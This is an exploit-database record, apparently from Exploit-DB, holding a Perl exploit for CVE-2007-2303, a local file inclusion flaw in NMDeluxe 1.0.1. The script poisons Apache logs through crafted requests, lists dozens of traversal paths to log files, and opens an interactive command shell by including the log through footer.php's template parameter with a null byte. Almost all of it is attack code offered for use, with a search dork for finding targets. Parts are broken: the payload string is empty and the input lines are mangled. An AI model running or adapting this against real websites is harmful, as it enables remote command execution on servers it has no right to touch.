{
  "id": "3742",
  "title": "NMDeluxe 1.0.1 - &#039;footer.php?template&#039; Local File Inclusion",
  "cve": "CVE-2007-2303",
  "vuln_type": "path_traversal",
  "code": "# Perl\r\n#\r\n# BeyazKurt B3yazKurt@Hotmail.Com\r\n#\r\n# NMDeluxe 1.0.1 (template) Local File Inclusion Exploit\r\n#\r\n# D0rk     : \"powered by NMDeluxe\" dorka gerenk yok ama nese :p\r\n#\r\n# D\u00c3\u00bcn trojen yedim a.q ! ba\u00c5\u0178ka t\u00c3\u00bcrl\u00c3\u00bc yapamaz zate lamerler\r\n#\r\n# Download : http://wsdeluxe.com/nmdeluxe/downloads.html Your Name & Site URL :p\r\n#\r\n#Coded by elden ele ge\u00e7\u00a9\u00af :)\r\n#\r\n\r\nuse IO::Socket;\r\nuse LWP::Simple;\r\n#ripped\r\n@apache=(\r\n\"../../../../../var/log/httpd/access_log\",\r\n\"../../../../../var/log/httpd/error_log\",\r\n\"../apache/logs/error.log\",\r\n\"../apache/logs/access.log\",\r\n\"../../apache/logs/error.log\",\r\n\"../../apache/logs/access.log\",\r\n\"../../../apache/logs/error.log\",\r\n\"../../../apache/logs/access.log\",\r\n\"../../../../apache/logs/error.log\",\r\n\"../../../../apache/logs/access.log\",\r\n\"../../../../../apache/logs/error.log\",\r\n\"../../../../../apache/logs/access.log\",\r\n\"../logs/error.log\",\r\n\"../logs/access.log\",\r\n\"../../logs/error.log\",\r\n\"../../logs/access.log\",\r\n\"../../../logs/error.log\",\r\n\"../../../logs/access.log\",\r\n\"../../../../logs/error.log\",\r\n\"../../../../logs/access.log\",\r\n\"../../../../../logs/error.log\",\r\n\"../../../../../logs/access.log\",\r\n\"../../../../../etc/httpd/logs/access_log\",\r\n\"../../../../../etc/httpd/logs/access.log\",\r\n\"../../../../../etc/httpd/logs/error_log\",\r\n\"../../../../../etc/httpd/logs/error.log\",\r\n\"../../.. /../../var/www/logs/access_log\",\r\n\"../../../../../var/www/logs/access.log\",\r\n\"../../../../../usr/local/apache/logs/access_log\",\r\n\"../../../../../usr/local/apache/logs/access.log\",\r\n\"../../../../../var/log/apache/access_log\",\r\n\"../../../../../var/log/apache/access.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/www/logs/error_log\",\r\n\"../../../../../var/www/logs/error.log\",\r\n\"../../../../../usr/local/apache/logs/error_log\",\r\n\"../../../../../usr/local/apache/logs/error.log\",\r\n\"../../../../../var/log/apache/error_log\",\r\n\"../../../../../var/log/apache/error.log\",\r\n\"../../../../../var/log/access_log\",\r\n\"../../../../../var/log/error_log\"\r\n);\r\nif (@ARGV < 3) {\r\nprint \"\r\nNMDeluxe 1.0.1 (template) Local File Inclusion Exploit\r\n###############################################################\r\nKullan.m : beyazkurt.pl [victim] [apachepath]\r\n###############################################################\r\n\";\r\nexit();\r\n}\r\n$host=$ARGV[0];\r\n$path=$ARGV[1];\r\n$apachepath=$ARGV[2];\r\nprint \"Code is injecting in logfiles...\\n\";\r\n$CODE=\"\";\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\",\r\nPeerPort=>\"80\") or die \"Connection failed.\\n\\n\";\r\nprint $socket \"GET \".$path.$CODE.\" HTTP/1.1\\r\\n\";\r\nprint $socket \"user-Agent: \".$CODE.\"\\r\\n\";\r\nprint $socket \"Host: \".$host.\"\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nclose($socket);\r\nprint \"Write END to exit!\\n\";\r\nprint \"If not working try another apache path\\n\\n\";\r\nprint \"[shell] \";$cmd = ;\r\nwhile($cmd !~ \"END\") {\r\n$socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$host\",\r\nPeerPort=>\"80\") or die \"Connection failed.\\n\\n\";\r\n#now include parameter\r\nprint $socket \"GET\r\n\".$path.\"/includes/footer.php?template=\".$apache[$apachepath].\"%00&cmd=$cmd\r\nHTTP/1.1\\r\\n\";\r\nprint $socket \"Host: \".$host.\"\\r\\n\";\r\nprint $socket \"Accept: */*\\r\\n\";\r\nprint $socket \"Connection: close\\r\\n\\r\\n\";\r\nwhile ($raspuns = <$socket>)\r\n{\r\nprint $raspuns;\r\n}\r\nprint \"[shell] \";\r\n$cmd = ;\r\n\r\n# milw0rm.com [2007-04-15]",
  "url": "https://www.exploit-db.com/exploits/3742"
}